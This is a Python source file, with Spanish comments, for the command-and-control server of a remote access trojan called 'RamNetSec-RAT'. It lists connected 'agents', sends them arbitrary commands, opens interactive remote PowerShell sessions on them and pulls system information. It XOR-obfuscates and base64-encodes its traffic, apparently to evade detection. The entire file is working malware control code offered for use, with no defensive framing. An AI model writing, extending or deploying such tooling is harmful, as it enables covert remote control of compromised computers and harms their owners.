import argparse
import socket
import threading
import sys
import logging
from colorama import init as colorama_init, Fore, Style
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.styles import Style as PTStyle
from ssh_server import SSHServer, ConnectedClient

def xor_obfuscate(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def xor_obfuscate_str(text: str, key: str) -> bytes:
    return xor_obfuscate(text.encode("utf-8"), key.encode("utf-8"))

def xor_deobfuscate_bytes(data: bytes, key: str) -> str:
    return xor_obfuscate(data, key.encode("utf-8")).decode("utf-8", errors="replace")

def main():
    # Inicializar colorama y logging
    colorama_init(autoreset=True)
    # Logging a consola y archivo
    logging.basicConfig(
        level=logging.INFO,
        format=f"{Fore.CYAN}[%(asctime)s]{Style.RESET_ALL} %(levelname)s: %(message)s",
        datefmt="%H:%M:%S",
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler("c2_server.log", encoding="utf-8")
        ]
    )

    parser = argparse.ArgumentParser(description="RamNetSec-RAT C2 Server")
    parser.add_argument('--host', default='0.0.0.0', help='Dirección IP para escuchar (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=2222, help='Puerto para escuchar (default: 2222)')
    parser.add_argument('--key', default='server.key', help='Ruta a la clave privada del servidor (default: server.key)')
    parser.add_argument('--xor', default=None, help='Clave para ofuscar comandos y respuestas con XOR (opcional)')
    args = parser.parse_args()

    xor_key = args.xor

    ssh_server = SSHServer(args.host, args.port, args.key)
    ssh_server.start()

    print(f"{Fore.CYAN}{Style.BRIGHT}Bienvenido a RamNetSec-RAT C2 Server CLI")
    print(f"{Fore.YELLOW}Usa los números o nombres para seleccionar opciones. Escribe 'Ctrl+C' para salir en cualquier momento.")
    print(f"{Fore.MAGENTA}Logs guardados en c2_server.log{Style.RESET_ALL}\n")
    logging.info(f"{Fore.GREEN}Servidor C2 iniciado. Esperando conexiones de agentes...{Style.RESET_ALL}\n")

    menu_completer = WordCompleter(['1', '2', '3', '4'], ignore_case=True)
    menu_style = PTStyle.from_dict({
        '': '#00ff00',
        'prompt': '#00ffff bold',
    })

    try:
        while True:
            print(f"\n{Fore.YELLOW}--- Menú C2 ---{Style.RESET_ALL}")
            print(f"{Fore.CYAN}1.{Style.RESET_ALL} Listar agentes conectados")
            print(f"{Fore.CYAN}2.{Style.RESET_ALL} Enviar comando a un agente")
            print(f"{Fore.CYAN}3.{Style.RESET_ALL} Desconectar agente")
            print(f"{Fore.CYAN}4.{Style.RESET_ALL} Salir")
            choice = prompt(
                [('class:prompt', 'Selecciona una opción: ')],
                completer=menu_completer,
                style=menu_style
            ).strip()
            if choice == '1':
                client_infos = ssh_server.get_client_info()
                if not client_infos:
                    logging.warning(f"{Fore.YELLOW}No hay agentes conectados.{Style.RESET_ALL}")
                else:
                    for idx, info in enumerate(client_infos):
                        print(f"{Fore.GREEN}{idx+1}.{Style.RESET_ALL} {info}")
            elif choice == '2':
                clients = ssh_server.list_clients()
                if not clients:
                    logging.warning(f"{Fore.YELLOW}No hay agentes conectados.{Style.RESET_ALL}")
                    continue
                for idx, client in enumerate(clients):
                    print(f"{Fore.GREEN}{idx+1}.{Style.RESET_ALL} {client}")
                # Autocompletado de agentes por nombre
                agent_names = [str(client) for client in clients]
                agent_completer = WordCompleter(agent_names, ignore_case=True)
                sel = prompt(
                    [('class:prompt', 'Selecciona el agente (nombre o número): ')],
                    completer=agent_completer,
                    style=menu_style
                ).strip()
                # Permitir seleccionar por número o por nombre
                sel_idx = None
                if sel.isdigit():
                    idx = int(sel) - 1
                    if 0 <= idx < len(clients):
                        sel_idx = idx
                else:
                    for idx, name in enumerate(agent_names):
                        if sel.lower() == name.lower():
                            sel_idx = idx
                            break
                if sel_idx is None:
                    logging.error(f"{Fore.RED}Selección inválida.{Style.RESET_ALL}")
                    continue
                cmd = prompt(
                    [('class:prompt', 'Comando a enviar (1=consola interactiva, 2=info técnica): ')],
                    style=menu_style
                ).strip()
                if not cmd:
                    logging.warning(f"{Fore.YELLOW}Comando vacío.{Style.RESET_ALL}")
                    continue

                # Modo interactivo PowerShell
                if cmd == "1":
                    logging.info(f"{Fore.BLUE}Entrando en modo consola interactiva PowerShell con {clients[sel_idx]}...{Style.RESET_ALL}")
                    # Enviar "1" para iniciar modo interactiva
                    if xor_key:
                        import base64
                        obf_cmd = xor_obfuscate_str("1", xor_key)
                        to_send = "__XOR__" + base64.b64encode(obf_cmd).decode("ascii")
                        result_raw = ssh_server.send_command(clients[sel_idx], to_send)
                    else:
                        result_raw = ssh_server.send_command(clients[sel_idx], "1")
                    # Mostrar mensaje de bienvenida del cliente
                    print(f"{Fore.MAGENTA}{result_raw}{Style.RESET_ALL}", end="")

                    import threading

                    stop_event = threading.Event()

                    def input_thread():
                        try:
                            while not stop_event.is_set():
                                user_input = prompt([('class:prompt', 'PS> ')]).strip()
                                if not user_input:
                                    continue
                                if xor_key:
                                    obf_cmd = xor_obfuscate_str(user_input, xor_key)
                                    to_send = "__XOR__" + base64.b64encode(obf_cmd).decode("ascii")
                                    ssh_server.send_raw(clients[sel_idx], to_send + "\n")
                                else:
                                    ssh_server.send_raw(clients[sel_idx], user_input + "\n")
                                if user_input.strip().lower() == "exit":
                                    stop_event.set()
                                    break
                        except (EOFError, KeyboardInterrupt):
                            stop_event.set()

                    def output_thread():
                        try:
                            while not stop_event.is_set():
                                line = ssh_server.recv_line(clients[sel_idx])
                                if line is None:
                                    print(f"{Fore.RED}\n[Desconectado del cliente]{Style.RESET_ALL}")
                                    stop_event.set()
                                    break
                                # Detectar delimitador de fin de sesión
                                if "__END__" in line:
                                    clean_line = line.replace("__END__", "")
                                    if clean_line:
                                        # Decodificar si es necesario
                                        result = clean_line
                                        if xor_key and result.startswith("__XOR__"):
                                            try:
                                                b64 = result[len("__XOR__") :]
                                                obf_resp = base64.b64decode(b64)
                                                try:
                                                    result = xor_deobfuscate_bytes(obf_resp, xor_key)
                                                except UnicodeDecodeError:
                                                    result = xor_obfuscate(obf_resp, xor_key.encode("utf-8")).decode("latin-1", errors="replace")
                                            except Exception as e:
                                                result = f"Error deofuscando respuesta: {e}\n{result}"
                                        print(f"{Fore.MAGENTA}{result}{Style.RESET_ALL}", end="")
                                    if "Saliendo de la consola interactiva" in line or "No se pudo iniciar PowerShell interactivo" in line or "No se pudo iniciar shell" in line:
                                        stop_event.set()
                                        break
                                else:
                                    # Decodificar si es necesario
                                    result = line
                                    if xor_key and result.startswith("__XOR__"):
                                        try:
                                            b64 = result[len("__XOR__") :]
                                            obf_resp = base64.b64decode(b64)
                                            try:
                                                result = xor_deobfuscate_bytes(obf_resp, xor_key)
                                            except UnicodeDecodeError:
                                                result = xor_obfuscate(obf_resp, xor_key.encode("utf-8")).decode("latin-1", errors="replace")
                                        except Exception as e:
                                            result = f"Error deofuscando respuesta: {e}\n{result}"
                                    print(f"{Fore.MAGENTA}{result}{Style.RESET_ALL}", end="")
                        except Exception as e:
                            print(f"{Fore.RED}\n[Error en la recepción de datos: {e}]{Style.RESET_ALL}")
                            stop_event.set()

                    t_in = threading.Thread(target=input_thread, daemon=True)
                    t_out = threading.Thread(target=output_thread, daemon=True)
                    t_in.start()
                    t_out.start()
                    try:
                        while t_in.is_alive() and t_out.is_alive():
                            t_in.join(timeout=0.1)
                            t_out.join(timeout=0.1)
                    except KeyboardInterrupt:
                        stop_event.set()
                        print(f"\n{Fore.YELLOW}[Sesión interactiva terminada por el usuario]{Style.RESET_ALL}")
                    continue

                # Modo info técnica
                if cmd == "2":
                    logging.info(f"{Fore.BLUE}Solicitando información técnica a {clients[sel_idx]}...{Style.RESET_ALL}")
                    if xor_key:
                        import base64
                        obf_cmd = xor_obfuscate_str("2", xor_key)
                        to_send = "__XOR__" + base64.b64encode(obf_cmd).decode("ascii")
                        result_raw = ssh_server.send_command(clients[sel_idx], to_send)
                        if result_raw.startswith("__XOR__"):
                            try:
                                b64 = result_raw[len("__XOR__") :]
                                obf_resp = base64.b64decode(b64)
                                result = xor_deobfuscate_bytes(obf_resp, xor_key)
                            except Exception as e:
                                result = f"Error deofuscando respuesta: {e}\n{result_raw}"
                        else:
                            result = result_raw
                    else:
                        result = ssh_server.send_command(clients[sel_idx], "2")
                    print(f"{Fore.MAGENTA}--- Información técnica de {clients[sel_idx]} ---{Style.RESET_ALL}\n{result}\n")
                    continue

                # Modo comando normal
                logging.info(f"{Fore.BLUE}Enviando comando a {clients[sel_idx]}...{Style.RESET_ALL}")
                if xor_key:
                    obf_cmd = xor_obfuscate_str(cmd, xor_key)
                    import base64
                    to_send = "__XOR__" + base64.b64encode(obf_cmd).decode("ascii")
                    result_raw = ssh_server.send_command(clients[sel_idx], to_send)
                    if result_raw.startswith("__XOR__"):
                        try:
                            b64 = result_raw[len("__XOR__") :]
                            obf_resp = base64.b64decode(b64)
                            result = xor_deobfuscate_bytes(obf_resp, xor_key)
                        except Exception as e:
                            result = f"Error deofuscando respuesta: {e}\n{result_raw}"
                    else:
                        result = result_raw
                else:
                    result = ssh_server.send_command(clients[sel_idx], cmd)
                print(f"{Fore.MAGENTA}--- Resultado de {clients[sel_idx]} ---{Style.RESET_ALL}\n{result}\n")
            elif choice == '3':
                clients = ssh_server.list_clients()
                if not clients:
                    logging.warning(f"{Fore.YELLOW}No hay agentes conectados.{Style.RESET_ALL}")
                    continue
                for idx, client in enumerate(clients):
                    print(f"{Fore.GREEN}{idx+1}.{Style.RESET_ALL} {client}")
                # Autocompletado de agentes por nombre para desconexión
                agent_names = [str(client) for client in clients]
                agent_completer = WordCompleter(agent_names, ignore_case=True)
                sel = prompt(
                    [('class:prompt', 'Selecciona el agente a desconectar (nombre o número): ')],
                    completer=agent_completer,
                    style=menu_style
                ).strip()
                sel_idx = None
                if sel.isdigit():
                    idx = int(sel) - 1
                    if 0 <= idx < len(clients):
                        sel_idx = idx
                else:
                    for idx, name in enumerate(agent_names):
                        if sel.lower() == name.lower():
                            sel_idx = idx
                            break
                if sel_idx is None:
                    logging.error(f"{Fore.RED}Selección inválida.{Style.RESET_ALL}")
                    continue
                ssh_server.disconnect_client(clients[sel_idx])
                logging.info(f"{Fore.YELLOW}Agente {clients[sel_idx]} desconectado.{Style.RESET_ALL}")
            elif choice == '4':
                logging.info(f"{Fore.YELLOW}Cerrando servidor...{Style.RESET_ALL}")
                ssh_server.stop()
                break
            else:
                logging.error(f"{Fore.RED}Opción inválida.{Style.RESET_ALL}")
    except KeyboardInterrupt:
        logging.info(f"\n{Fore.YELLOW}Interrumpido por el usuario. Cerrando servidor...{Style.RESET_ALL}")
        ssh_server.stop()
        sys.exit(0)

if __name__ == "__main__":
    main()
